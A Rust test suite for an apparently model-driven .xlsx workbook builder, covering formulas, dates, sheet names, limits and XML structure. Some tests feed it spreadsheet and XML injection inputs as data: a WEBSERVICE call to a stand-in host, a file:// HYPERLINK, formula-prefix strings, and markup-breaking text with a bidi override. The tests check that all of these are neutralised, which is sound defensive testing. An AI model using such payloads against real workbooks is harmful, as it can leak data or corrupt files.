        c.iter()
            .find(|x| x.0 == a)
            .unwrap_or_else(|| panic!("{a}"))
            .clone()
    };
    assert_eq!(get("A1"), ("A1".into(), "inlineStr".into(), "Item".into()));
    assert_eq!(get("A2").2, "Hosting");
    assert_eq!(get("B2"), ("B2".into(), "".into(), "1200.5".into()));
    assert_eq!(
        get("C2").2,
        "=B2/B4",
        "a formula, with no leading = in the file"
    );
    assert!(s.contains("<f>B2/B4</f>") && !s.contains("<f>=B2"));
    // Dates are serial numbers: 2026-12-01 is 46,357; the time is a fraction.
    assert_eq!(get("D2").2, "46357");
    let t: f64 = get("E2").2.parse().unwrap();
    assert!((t - 46_357.395_833_333).abs() < 1e-6, "{t}");
    let t: f64 = get("E3").2.parse().unwrap();
    assert!((t - (46357.0 + 64_830.0 / 86_400.0)).abs() < 1e-9, "{t}");
    assert_eq!(
        get("D3"),
        ("D3".into(), "inlineStr".into(), "not a date".into())
    );
    assert_eq!(get("F3").1, "b");
    assert_eq!(b.report.dates_left_as_text, 1);
    assert_eq!(b.report.formulas, 3);
    assert_eq!((b.report.sheets[0].rows, b.report.sheets[0].cols), (4, 6));
    // Cells and rows come in ascending order.
    let mut last = (0usize, 0usize);
    let (mut rows_seen, mut r) = (vec![], Reader::from_str(&s));
    loop {
        match r.read_event().unwrap() {
            Event::Start(e) if e.name().as_ref() == "row" => {
                let n: usize = e
                    .attributes()
                    .flatten()
                    .find(|a| a.key.as_ref() == "r")
                    .map(|a| a.value.parse().unwrap())
                    .unwrap();
                rows_seen.push(n);
                last = (n, 0);
            }
            Event::Start(e) if e.name().as_ref() == "c" => {
                let a = e
                    .attributes()
                    .flatten()
                    .find(|a| a.key.as_ref() == "r")
                    .map(|a| a.value.to_string())
                    .unwrap();
                let col = a.trim_end_matches(|c: char| c.is_ascii_digit());
                let colno = col
                    .bytes()
                    .fold(0usize, |n, b| n * 26 + (b - b'A') as usize + 1);
                assert!(colno > last.1, "{a} after column {}", last.1);
                last.1 = colno;
            }
            Event::Eof => break,
            _ => {}
        }
    }
    assert_eq!(rows_seen, [1, 2, 3, 4]);
    // Header, freeze, filter, widths, calculation on load.
    assert!(s.contains(
        "<pane ySplit=\"1\" topLeftCell=\"A2\" activePane=\"bottomLeft\" state=\"frozen\"/>"
    ));
    assert!(s.contains("<autoFilter ref=\"A1:F4\"/>"));
    assert!(s.contains("<dimension ref=\"A1:F4\"/>"));
    assert!(s.contains("<col min=\"1\" max=\"1\" width=\"28.00\" customWidth=\"1\"/>"));
    let wb = part(&b.bytes, "xl/workbook.xml");
    assert!(wb.contains("fullCalcOnLoad=\"1\""));
    assert!(wb.contains("_xlnm._FilterDatabase") && wb.contains("'Q1'!$A$1:$F$4"));
    // No formula has a cached value.
    assert!(!s.contains("</f><v>"));
    // Element order of the worksheet and the workbook.
    let pos = |h: &str, n: &str| h.find(n).unwrap_or_else(|| panic!("{n}"));
    let order = [
        "<dimension",
        "<sheetViews",
        "<sheetFormatPr",
        "<cols",
        "<sheetData",
        "<autoFilter",
        "<pageMargins",
    ];
    for w in order.windows(2) {
        assert!(pos(&s, w[0]) < pos(&s, w[1]), "{w:?}");
    }
    let order = [
        "<workbookPr",
        "<bookViews",
        "<sheets",
        "<definedNames",
        "<calcPr",
    ];
    for w in order.windows(2) {
        assert!(pos(&wb, w[0]) < pos(&wb, w[1]), "{w:?}");
    }
    // The styles: the header and the bold total are bold, a currency format exists.
    let st = part(&b.bytes, "xl/styles.xml");
    assert!(st.contains("formatCode=\"&quot;$&quot;#,##0.00\""));
    assert!(st.contains(&format!("<cellXfs count=\"{}\">", 19)));
    assert!(
        s.contains("<c r=\"A1\" s=\"18\""),
        "the header cell has the header style"
    );
    assert!(s.contains("<c r=\"A4\" s=\"1\""), "the last row is bold");
}

#[test]
fn a_string_is_text_whatever_it_starts_with() {
    let b = sheet_book(json!({"sheets": [{"rows": [
        ["=1+1", "+SUM(A1)", "-2+3", "@SUM(A1)", "=WEBSERVICE(\"http://x\")", "  =x", "\t=x"]]}]}));
    let s = part(&b.bytes, "xl/worksheets/sheet1.xml");
    assert!(!s.contains("<f>"), "{s}");
    let c = cells(&s);
    assert_eq!(c.len(), 7);
    for (_, t, text) in &c {
        assert_eq!(t, "inlineStr");
        assert!(!text.is_empty());
    }
    assert_eq!(c[0].2, "=1+1");
    assert_eq!(c[4].2, "=WEBSERVICE(\"http://x\")");
    assert_eq!(b.report.formulas, 0);
}

#[test]
fn a_formula_that_is_refused_refuses_the_workbook_and_names_the_cell() {
    let e = xlsx::build(
        &json!({"sheets": [{"name": "S", "rows": [[1, {"f": "WEBSERVICE(\"http://x\")"}]]}]}),
        0,
    )
    .err()
    .unwrap();
    assert!(
        e.contains("B1") && e.contains("WEBSERVICE") && e.contains("\"S\""),
        "{e}"
    );
    let e = xlsx::build(
        &json!({"sheets": [{"rows": [[{"f": "HYPERLINK(\"file:///x\")"}]]}]}),
        0,
    )
    .err()
    .unwrap();
    assert!(e.contains("A1") && e.contains("HYPERLINK"), "{e}");
}

#[test]
fn sheet_names_are_made_valid_and_unique() {
    let long = "x".repeat(40);
    let b = sheet_book(json!({"sheets": [
        {"name": "it's"}, {"name": "'quoted'"}, {"name": "a!b"}, {"name": "[x]:y/z\\w?*"},
        {"name": long}, {"name": long.to_uppercase()}, {"name": "Budget"}, {"name": "budget"},
        {"name": ""}, {"name": "History"}, {"name": "\u{202E}evil\u{0}"}, {}
    ]}));
    let names: Vec<&str> = b.report.sheets.iter().map(|s| s.name.as_str()).collect();
    let mut seen = HashSet::new();
    for n in &names {
        assert!(!n.is_empty() && n.chars().count() <= 31, "{n:?}");
        assert!(!n.chars().any(|c| ":\\/?*[]".contains(c)), "{n:?}");
        assert!(!n.starts_with('\'') && !n.ends_with('\''), "{n:?}");
        assert!(seen.insert(n.to_lowercase()), "duplicate {n:?}");
        assert!(!n.eq_ignore_ascii_case("history"), "{n:?}");
        assert!(
            !n.chars().any(|c| xml::is_override(c) || c.is_control()),
            "{n:?}"
        );
    }
    assert_eq!(names[0], "it's");
    assert_eq!(names[1], "quoted");
    assert_eq!(names[2], "a!b");
    assert_eq!(names[3], "_x__y_z_w__");
    assert_eq!(names[4], "x".repeat(31));
    assert_eq!(names[5], format!("{} (2)", "X".repeat(27)));
    assert_eq!(names[7], "budget (2)");
    assert_eq!(names[8], "Sheet9");
    assert_eq!(names[9], "History_");
    assert_eq!(names[11], "Sheet12");
    assert_eq!(
        b.report.sheets[4].renamed_from.as_deref(),
        Some(long.as_str()).map(|l| &l[..40])
    );
    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
    // A sheet name with a quote works in the filter's defined name.
    let b = sheet_book(
        json!({"sheets": [{"name": "it's", "columns": [{"header": "A"}], "rows": [[1]]}]}),
    );
    let wb = part(&b.bytes, "xl/workbook.xml");
    assert!(wb.contains("'it''s'!$A$1:$A$2"), "{wb}");
    assert!(problems(&b.bytes).is_empty());
}

#[test]
fn text_from_the_model_is_data_in_every_cell_header_name_and_formula() {
    let nasty =
        "</t></is></c><c r=\"Z9\"><f>WEBSERVICE(1)</f></c>]]>&amp;\u{0}\u{1}\u{B}\u{FFFE}\u{202E}x";
    let b = sheet_book(json!({"currency": "$", "sheets": [{
        "name": nasty,
        "columns": [{"header": nasty}],
        "rows": [[nasty], [{"f": format!("A2&\"{}\"", nasty.replace('"', "\"\""))}]]}]}));
    assert!(problems(&b.bytes).is_empty(), "{:?}", problems(&b.bytes));
    for p in [
        "xl/workbook.xml",
        "xl/worksheets/sheet1.xml",
        "xl/styles.xml",
        "docProps/core.xml",
    ] {
        let s = part(&b.bytes, p);
        assert!(
            !s.contains("<c r=\"Z9\">") && !s.contains("<f>WEBSERVICE"),
            "{p}"
        );
        assert!(
            !s.chars().any(|c| !xml::allowed(c) || xml::is_override(c)),
            "{p}"
        );
    }
    let c = cells(&part(&b.bytes, "xl/worksheets/sheet1.xml"));
    assert!(
        c[0].2.starts_with("</t></is></c>"),
        "the header reads back as text: {c:?}"
    );
    assert_eq!(
        c.iter()
            .filter(|x| x.1.is_empty() && x.2.starts_with('='))
            .count(),
        1
    );
    // The currency sign is a short sign, never markup.
    for bad in ["\"><x/>", "ABCD", "", "a b", "<"] {
        let e = xlsx::build(&json!({"currency": bad, "sheets": [{}]}), 0);
        assert!(e.is_err(), "{bad:?}");
    }
    let ok = sheet_book(json!({"currency": "€", "sheets": [{}]}));
    assert!(part(&ok.bytes, "xl/styles.xml").contains("&quot;€&quot;"));
}

#[test]
fn the_format_list_is_closed_and_the_spec_is_strict() {
    for bad in [
        "General",
        "0.00",
        "#,##0.00;[Red]-#,##0.00",
        "yyyy",
        "Text",
        "",
        "@",
    ] {
        let e = xlsx::build(
            &json!({"sheets": [{"columns": [{"header": "a", "format": bad}]}]}),
            0,
        )
        .err()
        .unwrap_or_else(|| panic!("{bad:?} was taken"));
        assert!(
            e.contains("text, integer, number, number2, percent, currency, date, datetime"),
            "{e}"
        );
    }
    for name in [
        "text", "integer", "number", "number2", "percent", "currency", "date", "datetime",
    ] {
        sheet_book(
            json!({"sheets": [{"columns": [{"header": "a", "format": name}], "rows": [[1]]}]}),
        );
    }
    for spec in [
        json!([]),
        json!({}),
        json!({"sheets": []}),
        json!({"sheets": {}}),
        json!({"sheets": [1]}),
        json!({"sheets": [{"rows": 1}]}),
        json!({"sheets": [{"rows": [1]}]}),
        json!({"sheets": [{"rows": [[[1]]]}]}),
        json!({"sheets": [{"rows": [[{"g": 1}]]}]}),
        json!({"sheets": [{"rows": [[{"f": 1}]]}]}),
        json!({"sheets": [{"rows": [[{"f": "A1", "extra": 1}]]}]}),
        json!({"sheets": [{"extra": 1}]}),
        json!({"sheets": [], "extra": 1}),
        json!({"sheets": [{"columns": [{"header": 1}]}]}),
        json!({"sheets": [{"columns": [{"width": 0}]}]}),
        json!({"sheets": [{"columns": [{"width": 101}]}]}),
        json!({"sheets": [{"columns": [{"width": "wide"}]}]}),
        json!({"sheets": [{"columns": [{"extra": 1}]}]}),
        json!({"sheets": [{"freeze_header": "yes"}]}),
        json!({"sheets": [{"name": 5}]}),
    ] {
        assert!(xlsx::build(&spec, 0).is_err(), "{spec}");
    }
}

#[test]
fn the_workbook_limits_hold_at_the_edge_and_one_past_it() {
    let sheets = |n: usize| json!({"sheets": vec![json!({}); n]});
    assert!(xlsx::build(&sheets(MAX_SHEETS), 0).is_ok());
    assert!(
        xlsx::build(&sheets(MAX_SHEETS + 1), 0)
            .unwrap_err()
            .contains("sheets")
    );
    let rows = |n: usize| json!({"sheets": [{"rows": vec![json!([1]); n]}]});
    assert!(xlsx::build(&rows(MAX_ROWS), 0).is_ok());
    assert!(
        xlsx::build(&rows(MAX_ROWS + 1), 0)
            .unwrap_err()
            .contains("rows")
    );
    // With a header row the header counts.
    let with_header =
        |n: usize| json!({"sheets": [{"columns": [{"header": "h"}], "rows": vec![json!([1]); n]}]});
    assert!(xlsx::build(&with_header(MAX_ROWS - 1), 0).is_ok());
    assert!(
        xlsx::build(&with_header(MAX_ROWS), 0)
            .unwrap_err()
            .contains("rows")
    );
    let cols = |n: usize| json!({"sheets": [{"rows": [vec![json!(1); n]]}]});
    assert!(xlsx::build(&cols(MAX_COLS), 0).is_ok());
    assert!(
        xlsx::build(&cols(MAX_COLS + 1), 0)
            .unwrap_err()
            .contains("cells")
    );
    let heads = |n: usize| json!({"sheets": [{"columns": vec![json!({"header": "h"}); n]}]});
    assert!(xlsx::build(&heads(MAX_COLS), 0).is_ok());
    assert!(
        xlsx::build(&heads(MAX_COLS + 1), 0)
            .unwrap_err()
            .contains("columns")
    );
    // Cells per call: 20 sheets x 5,000 rows x 2 cols = 200,000.
    let many =
        |rows: usize| json!({"sheets": vec![json!({"rows": vec![json!([1, 2]); rows]}); 20]});
    assert!(xlsx::build(&many(MAX_CELLS / 40), 0).is_ok());
    assert!(
        xlsx::build(&many(MAX_CELLS / 40 + 1), 0)
            .unwrap_err()
            .contains("cells")
    );
    // Text length.
    let text = |n: usize| json!({"sheets": [{"rows": [["é".repeat(n)]]}]});
    assert!(xlsx::build(&text(MAX_CELL_CHARS), 0).is_ok());
    assert!(
        xlsx::build(&text(MAX_CELL_CHARS + 1), 0)
            .unwrap_err()
            .contains("A1")
    );
    let head = |n: usize| json!({"sheets": [{"columns": [{"header": "h".repeat(n)}]}]});
    assert!(xlsx::build(&head(MAX_HEADER_CHARS), 0).is_ok());
    assert!(xlsx::build(&head(MAX_HEADER_CHARS + 1), 0).is_err());
    let f = |n: usize| json!({"sheets": [{"rows": [[{"f": format!("{}1", "1+".repeat(n))}]]}]});
    assert!(xlsx::build(&f(MAX_FORMULA_CHARS / 2 - 1), 0).is_ok());
    assert!(
        xlsx::build(&f(MAX_FORMULA_CHARS / 2 + 1), 0)
            .unwrap_err()
            .contains("longer")
    );
}

#[test]
fn dates_are_real_dates_only_when_they_are_dates() {
    assert_eq!(xlsx::iso_serial("2000-01-01"), Some(36_526.0));
    assert_eq!(xlsx::iso_serial("1900-03-01"), Some(61.0));
    assert_eq!(xlsx::iso_serial("2026-12-01"), Some(46_357.0));
    assert_eq!(xlsx::iso_serial("2026-12-01T12:00"), Some(46_357.5));
    assert_eq!(xlsx::iso_serial("2026-12-01 12:00:00Z"), Some(46_357.5));
    assert_eq!(xlsx::iso_serial("9999-12-31"), Some(2_958_465.0));
    for bad in [
        "1900-02-28",
        "1899-12-31",
        "2026-02-30",
        "2026-13-01",
        "2026-00-10",
        "2026-1-1",
        "26-12-01",
        "2026/12/01",
        "01-12-2026",
        "2026-12-01T25:00",
        "2026-12-01T10:61",
        "2026-12-01T10",
        "tomorrow",
        "",
        "2026-12-01T10:00:00:00",
        "2023-02-29",
    ] {
        assert_eq!(xlsx::iso_serial(bad), None, "{bad:?}");
    }
    assert_eq!(xlsx::iso_serial("2024-02-29"), Some(45_351.0));
    // Only in a date column; elsewhere the string stays text.
    let b = sheet_book(
        json!({"sheets": [{"columns": [{"header": "a"}, {"header": "b", "format": "date"}],
        "rows": [["2026-12-01", "2026-12-01"]]}]}),
    );
    let c = cells(&part(&b.bytes, "xl/worksheets/sheet1.xml"));
    assert_eq!(c[1].1, "inlineStr");
    assert_eq!(c[3].1, "");
    assert_eq!(c[3].2, "46357");
}

#[test]
fn column_letters_and_a_spec_with_no_header() {
    assert_eq!(xlsx::col_letters(0), "A");
    assert_eq!(xlsx::col_letters(25), "Z");
    assert_eq!(xlsx::col_letters(26), "AA");
    assert_eq!(xlsx::col_letters(51), "AZ");
    assert_eq!(xlsx::col_letters(52), "BA");
    assert_eq!(xlsx::col_letters(701), "ZZ");
    assert_eq!(xlsx::col_letters(702), "AAA");
    let b = sheet_book(json!({"sheets": [{"rows": [["a", 1], ["b", 2]]}]}));
    let s = part(&b.bytes, "xl/worksheets/sheet1.xml");
    assert!(!s.contains("<pane") && !s.contains("<autoFilter"));
    assert_eq!(cells(&s)[0].2, "a");
    assert!(problems(&b.bytes).is_empty());
    // An empty sheet is still a valid sheet.
    let b = sheet_book(json!({"sheets": [{}]}));
    assert!(problems(&b.bytes).is_empty());
    assert!(part(&b.bytes, "xl/worksheets/sheet1.xml").contains("<dimension ref=\"A1:A1\"/>"));
}

#[test]
fn bytes_are_repeatable_and_properties_carry_the_time() {
    let a = sheet_book(budget()).bytes;
    assert_eq!(a, sheet_book(budget()).bytes);
    assert!(part(&a, "docProps/core.xml").contains("2026-"));
    assert_eq!(crate::iso_utc(0), "1970-01-01T00:00:00Z");
    assert_eq!(crate::iso_utc(1_795_000_000), "2026-11-18T11:06:40Z");
}
